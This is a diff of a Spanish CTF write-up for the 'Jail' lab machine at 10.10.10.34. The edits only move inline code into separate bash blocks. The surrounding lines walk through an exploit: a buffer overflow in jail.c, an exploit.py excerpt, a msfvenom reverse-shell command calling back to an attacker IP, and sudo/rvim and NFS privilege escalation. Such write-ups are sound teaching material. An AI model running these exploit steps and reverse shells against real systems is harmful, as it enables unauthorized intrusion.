@@ -66,7 +66,11 @@ Es un Apache 2.4.6 en un CentOS.
 
 #### Checkear la web {-}
 
-Si entramos en la url `http://10.10.10.34`, Vemos la Apache2 default page.
+Si entramos en la url 
+```bash
+ http://10.10.10.34 
+```
+, Vemos la Apache2 default page.
 
 
 #### Checkeando la cavezera con curl {-}
@@ -82,7 +86,15 @@ curl -s -X GET "http://10.10.10.34" -I
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.34/FUZZ
 ```
 
-Vemos un directorio `/jailuser` que lista un directorio `dev` que contiene ficheros. Nos descargamos estos ficheros.
+Vemos un directorio 
+```bash
+ /jailuser 
+```
+ que lista un directorio 
+```bash
+ dev 
+```
+ que contiene ficheros. Nos descargamos estos ficheros.
 
 
 ### Analysando el puerto 7411 {-}
@@ -96,7 +108,11 @@ Nos pone **send user command** pero no llegamos a ver nada por el momento.
 ### Analyzando el NFS {-}
 
 Buscando por internet que es el NFS y de que manera podriamos scanear este servicio, vemos que funcciona
-como recursos compartidos a nivel de red que podriamos scanear con la utilidad `showmount` y que podriamos
+como recursos compartidos a nivel de red que podriamos scanear con la utilidad 
+```bash
+ showmount 
+```
+ y que podriamos
 montar en nuestro equipo.
 
 ```bash
@@ -111,7 +127,11 @@ Hemos descargado 3 ficheros:
 - jail.c
 - compile.sh
 
-El fichero `compile.sh` nos muestra de que manera compila el fichero jail.c para crear un binario jail de 32 bits y como lanza el servicio.
+El fichero 
+```bash
+ compile.sh 
+```
+ nos muestra de que manera compila el fichero jail.c para crear un binario jail de 32 bits y como lanza el servicio.
 
 Miramos que typo de fichero y de seguridad lleva el fichero jail con:
 
@@ -123,7 +143,15 @@ checksec jail
 
 Aqui vemos que este fichero es de 32 bits y vemos que no tiene ninguna proteccion como DEP o PIE.
 
-Mirando el codigo del fichero `jail.c` vemos un print que nos dice **send user command** y que usa funcciones como `strcmp()`
+Mirando el codigo del fichero 
+```bash
+ jail.c 
+```
+ vemos un print que nos dice **send user command** y que usa funcciones como 
+```bash
+ strcmp() 
+```
+
 que ya sabemos que son vulnerables.
 
 Ahora que vemos por donde van los tiros y que esta maquina tocara un BOF, analyzamos las vulnerabilidades.
@@ -132,13 +160,29 @@ Ahora que vemos por donde van los tiros y que esta maquina tocara un BOF, analyz
 
 ### Buffer Overflow {-}
 
-El codigo nos muestra que compara una String con un username `admin` y una contraseña `1974jailbreak!`.
+El codigo nos muestra que compara una String con un username 
+```bash
+ admin 
+```
+ y una contraseña 
+```bash
+ 1974jailbreak! 
+```
+.
 Vemos que hay una posibilidad de lanzar el binario en modo **Debug**. 
 
-Vemos que una de estas comparativas va con una variable `userpass` que solo tiene un Buffer de 16 Bytes y 
+Vemos que una de estas comparativas va con una variable 
+```bash
+ userpass 
+```
+ que solo tiene un Buffer de 16 Bytes y 
 que si lanzamos el binario en modo debug, nos printa la direccion memoria de esta variable.
 
-Tambien vemos que el binario abre el puerto 7411 y lo comprobamos con `lsof`
+Tambien vemos que el binario abre el puerto 7411 y lo comprobamos con 
+```bash
+ lsof 
+```
+
 
 ```bash
 lsof -i:7411
@@ -228,7 +272,11 @@ Ademas, ya vemos que sobre escribimos registros con A y desde aqui seguimos la g
         PASS aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
         ```
 
-    - el programa peta una vez mas pero el valor del `$eip` a cambiado. Miramos el offset con el commando
+    - el programa peta una vez mas pero el valor del 
+```bash
+ $eip 
+```
+ a cambiado. Miramos el offset con el commando
 
         ```bash
         gef➤  pattern offset $eip
@@ -285,8 +333,16 @@ Ademas, ya vemos que sobre escribimos registros con A y desde aqui seguimos la g
         0xffffd170  0x00000001  0xf7ffd590  0x00000000  0x414112db
         ``` 
 
-Aqui vemos que la direccion `0xffffd140` apunta al principio del Buffer (la entrada del usuario). Esto significa
-que si el **eip** apunta a la direccion `0xfffd140` sumada por 32 bytes (que serian las 28 A mas los 4 bytes del **eip**),
+Aqui vemos que la direccion 
+```bash
+ 0xffffd140 
+```
+ apunta al principio del Buffer (la entrada del usuario). Esto significa
+que si el **eip** apunta a la direccion 
+```bash
+ 0xfffd140 
+```
+ sumada por 32 bytes (que serian las 28 A mas los 4 bytes del **eip**),
 podriamos ejecutar el shellcode que queremos.
 
 
@@ -323,7 +379,11 @@ p.recvuntil("OK Send PASS command.")
 p.sendline("PASS ".encode() + before_eip + EIP + after_eip)
 ```
 
-> [ ! ] NOTAS: el shellcode a sido creado con el comando `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -b "\x00\x0a" -f python`. Los badchars
+> [ ! ] NOTAS: el shellcode a sido creado con el comando 
+```bash
+ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -b "\x00\x0a" -f python 
+```
+. Los badchars
 aqui son los que ponemos siempre.
 
 Ahora testeamos el script
@@ -350,7 +410,11 @@ En este caso no funcciona y tito nos adelanta que el problema viene que de vez e
 o mejor dicho es demasiado grande. Esta limitacion puede ser bypasseada por una tecnica llamada **reuse addr** explicada en la web de [rastating](https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/).
 La tecnica consiste en utilizar methodos **send** o **recv** del socket de coneccion para ganar espacio para el shellcode.
 
-Si buscamos por shellcode re-use en [exploit-db](https://www.exploit-db.com/shellcodes/34060), podemos encontrar shellcode que crearian un `/bin/bash`
+Si buscamos por shellcode re-use en [exploit-db](https://www.exploit-db.com/shellcodes/34060), podemos encontrar shellcode que crearian un 
+```bash
+ /bin/bash 
+```
+
 
 Modificamos el shellcode del exploit.py y ganamos accesso a la maquina victima
 
@@ -418,7 +482,11 @@ id
 sudo -l
 ```
 
-Vemos que podemos lanzar el script `/opt/logreader/logreader.sh` como el usuario frank sin proporcionar contraseña.
+Vemos que podemos lanzar el script 
+```bash
+ /opt/logreader/logreader.sh 
+```
+ como el usuario frank sin proporcionar contraseña.
 
 ```bash
 cat /opt/logreader/logreader.sh
@@ -461,7 +529,11 @@ maquina victima
 
 > [ ! ] NOTAS: Si no existe docker en nuestra maquina de atacante, tendriamos que ver el numero 1000 y tendriamos que crear un grupo con este id para operar
 
-1. Creamos un fichero en C en el directorio `/mnt/var`
+1. Creamos un fichero en C en el directorio 
+```bash
+ /mnt/var 
+```
+
 
     ```bash
     #include <unistd.h>
@@ -508,7 +580,15 @@ id
 sudo -l
 ```
 
-Aqui vemos que podriamos ejecutar el `/usr/bin/rvim` del fichero `/var/www/html/jailuser/dev/jail.c` como el usuario adm sin proporcionar contraseña.
+Aqui vemos que podriamos ejecutar el 
+```bash
+ /usr/bin/rvim 
+```
+ del fichero 
+```bash
+ /var/www/html/jailuser/dev/jail.c 
+```
+ como el usuario adm sin proporcionar contraseña.
 
 ```bash
 sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c
@@ -530,7 +610,11 @@ whoami
 adm
 ```
 
-Aqui vemos que estamos en el directorio `/var/adm`
+Aqui vemos que estamos en el directorio 
+```bash
+ /var/adm 
+```
+
 
 ```bash
 ls -la
@@ -552,7 +636,11 @@ Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw u
 Lanzamos la web de [quipqiup](https://www.quipqiup.com/) y copiamos el mensaje y nos lo traduce por 
 **Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!**
 
-Tambien hay un `keys.rar`.
+Tambien hay un 
+```bash
+ keys.rar 
+```
+.
 
 Lo codificamos en base64 y nos lo tranferimos a nuestra maquina de atacante.
 
@@ -567,7 +655,11 @@ echo "hash de base64" | base64 -d > keys.rar
 unrar x keys.rar
 ```
 
-Aqui nos pide una contraseña para unrarear el `keys.rar` y buscando por internet Alcatraz Escape vemos que un Frank Morris se escapo de Alcatraz en 1962.
+Aqui nos pide una contraseña para unrarear el 
+```bash
+ keys.rar 
+```
+ y buscando por internet Alcatraz Escape vemos que un Frank Morris se escapo de Alcatraz en 1962.
 Vamos a tirar de la utilidad de crunch para crackear la contraseña.
 
 ```bash
@@ -576,7 +668,11 @@ rar2john keys.rar > hash
 john --wordlist=passwords hash
 ```
 
-Encontramos la contraseña `Morris1962!`
+Encontramos la contraseña 
+```bash
+ Morris1962! 
+```
+
 
 ```bash
 unrar x keys.rar
@@ -600,7 +696,19 @@ print(key.q)
 print(key.e)
 ```
 
-Aqui como `key.n` es demasiado grande, no a sido posible computar `key.p` o `key.q` que nos ubiera permitido intentar generar una private key.
+Aqui como 
+```bash
+ key.n 
+```
+ es demasiado grande, no a sido posible computar 
+```bash
+ key.p 
+```
+ o 
+```bash
+ key.q 
+```
+ que nos ubiera permitido intentar generar una private key.
 
 Miramos si podemos hacerlo desde [factordb](http://factordb.com/) pero es lo mismo. Pero existen webs para los ctf como [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
 que podemos usar.
